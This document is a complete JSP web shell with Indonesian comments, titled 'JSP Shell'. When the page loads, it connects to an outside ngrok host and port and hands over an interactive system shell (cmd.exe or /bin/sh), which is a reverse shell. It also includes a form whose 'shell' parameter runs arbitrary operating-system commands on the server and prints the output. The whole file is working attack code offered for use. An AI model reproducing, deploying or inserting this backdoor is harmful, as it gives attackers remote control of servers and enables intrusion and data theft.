<%@ page import="java.io.*, java.net.*, java.util.*" %>
<%
    // --- Setup shell path berdasarkan OS
    String shellPath = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";

    // --- Fungsi untuk Reverse Shell
    class StreamConnector extends Thread {
        InputStream is;
        OutputStream os;

        StreamConnector(InputStream is, OutputStream os) {
            this.is = is;
            this.os = os;
        }

        public void run() {
            try {
                byte[] buffer = new byte[1024];
                int len;
                while ((len = is.read(buffer)) != -1) {
                    os.write(buffer, 0, len);
                    os.flush();
                }
            } catch (Exception e) {
                // Silent exception
            } finally {
                try { is.close(); } catch (Exception e) {}
                try { os.close(); } catch (Exception e) {}
            }
        }
    }

    // --- Mencoba koneksi reverse shell
    try {
        String attackerIP = "0.tcp.ap.ngrok.io";
        int attackerPort = 13914;
        Socket socket = new Socket(attackerIP, attackerPort);
        Process process = new ProcessBuilder(shellPath).redirectErrorStream(true).start();

        (new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
        (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();

        out.println("[+] Reverse shell connected to " + attackerIP + ":" + attackerPort + "<br>");
    } catch (Exception e) {
        out.println("[-] Reverse shell failed: " + e.getMessage() + "<br>");
    }

    // --- Web-based shell fallback
    String command = request.getParameter("shell");
    if (command != null && !command.trim().equals("")) {
        out.println("<b>Command:</b> " + command + "<br><pre>");
        try {
            Process process;
            if (shellPath.equals("cmd.exe")) {
                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});
            } else {
                process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});
            }

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line + "\n");
            }
            reader.close();
        } catch (Exception e) {
            out.println("Error executing command: " + e.getMessage());
        }
        out.println("</pre>");
    }
%>

<html>
<head>
    <title>JSP Shell</title>
</head>
<body>
    <form method="POST">
        <input type="text" name="shell" placeholder="Type command here" style="width:300px;">
        <input type="submit" value="Execute">
    </form>
</body>
</html>
